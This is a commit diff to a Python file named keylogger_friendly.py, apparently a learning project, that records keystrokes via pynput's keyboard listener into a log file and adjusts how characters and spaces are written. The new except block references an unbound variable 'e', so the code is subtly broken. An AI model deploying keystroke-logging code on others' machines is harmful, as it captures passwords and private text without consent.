d4c9bc06e5c073d74e31261f560cbe5925910fa5
SMOOTHxCHILL <anirudh0706@gmail.com>
2024-10-11 21:08:03 +0530

    Update keylogger_friendly.py

--- keylogger_friendly.py
+++ keylogger_friendly.py
@@ -7,10 +7,14 @@ def keyPressed(key):
         #try statement runs whatever is inisde the block and if it raises an error while doing that, the except block runs
         try:
             #only takes the characters and not literal buttons as the listener function listens to all keys including mouse
-            char = key.char
-            logKey.write(char)
+            #char = key.char if key.char else ' ' '''This is a shorthand way of writing: '''
+            if hasattr(key, 'char'):
+                logKey.write(key.char)
+            else:
+                if key == keyboard.Key.space:
+                    logKey.write(' ')
         except:
-            print("Error getting char")
+            print(f"Error: {e}")
 
 #keyboard.Listener() function listens to the inputs of all keys in keyboard and mouse; on_press calls the defined function keyPressed() along with its parameters (key)
 listener = keyboard.Listener(on_press=keyPressed)
